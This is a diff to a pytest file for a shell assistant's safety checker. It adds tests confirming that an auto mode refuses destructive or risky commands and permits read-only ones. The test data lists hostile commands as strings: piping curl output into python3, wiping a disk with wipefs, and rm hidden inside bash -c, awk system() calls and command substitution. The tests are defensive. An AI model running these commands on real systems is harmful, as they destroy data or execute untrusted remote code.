@@ -1,6 +1,6 @@
 import pytest
 
-from smart_shell.safety import check_command_safety
+from smart_shell.safety import check_command_safety, is_auto_safe
 
 
 @pytest.mark.parametrize("command, status", [
@@ -17,7 +17,8 @@ from smart_shell.safety import check_command_safety
     ("git push --force origin main", "medium"),
     ("docker system prune", "medium"),
     ("grep -rm 5 x .", "safe"),
-    ("ls > files.txt", "safe"),
+    ("ls > files.txt", "medium"),
+    ("cmd >/dev/null 2>&1", "safe"),
     ("echo hi >> log", "safe"),
     ("git status", "safe"),
     # blocked
@@ -63,3 +64,48 @@ from smart_shell.safety import check_command_safety
 ])
 def test_risk_level(command, status):
     assert check_command_safety(command)["status"] == status
+
+
+# Auto mode runs a plan unasked only if every step is read-only. These all have to ask.
+@pytest.mark.parametrize("command", [
+    "echo hi\nrm -f important.txt",
+    'for f in *.txt; do rm "$f"; done',
+    "if true; then rm -f x; fi",
+    "{ rm -f x; }",
+    "nohup rm -f x",
+    "time rm -f x",
+    "env rm -f x",
+    "\\rm -f x",
+    "bash -c 'rm -f important.txt'",
+    "find -delete",
+    r"find . -execdir rm {} \;",
+    "find . -name x -exec ls {} +",
+    "curl http://x | python3",
+    "bash <(curl http://x)",
+    "wipefs -a /dev/sda",
+    "git checkout .",
+    "git stash drop",
+    "git push",
+    "echo x > file",
+    "mv a b",
+    "cp /dev/null notes.txt",
+    "tee f < /dev/null",
+    "sed -i s/a/b/ f",
+    "ls | xargs rm",
+    "awk 'BEGIN{system(\"rm x\")}'",
+    "systemctl stop sshd",
+    "python3 x.py",
+    "echo $(rm x)",
+    "ls `rm x`",
+])
+def test_auto_mode_refuses(command):
+    assert not is_auto_safe(command)
+
+
+@pytest.mark.parametrize("command", [
+    "ls -la", "df -h", "du -sh * | sort -h | tail -5", "git log -3 --oneline", "git status",
+    "ps aux | grep python", "find . -name '*.py' | wc -l", "grep -rn TODO . 2>/dev/null",
+    "ip addr show", "systemctl status ssh", "journalctl -n 50", "grep -E '[a-z]+' f.txt",
+])
+def test_auto_mode_runs_read_only(command):
+    assert is_auto_safe(command)
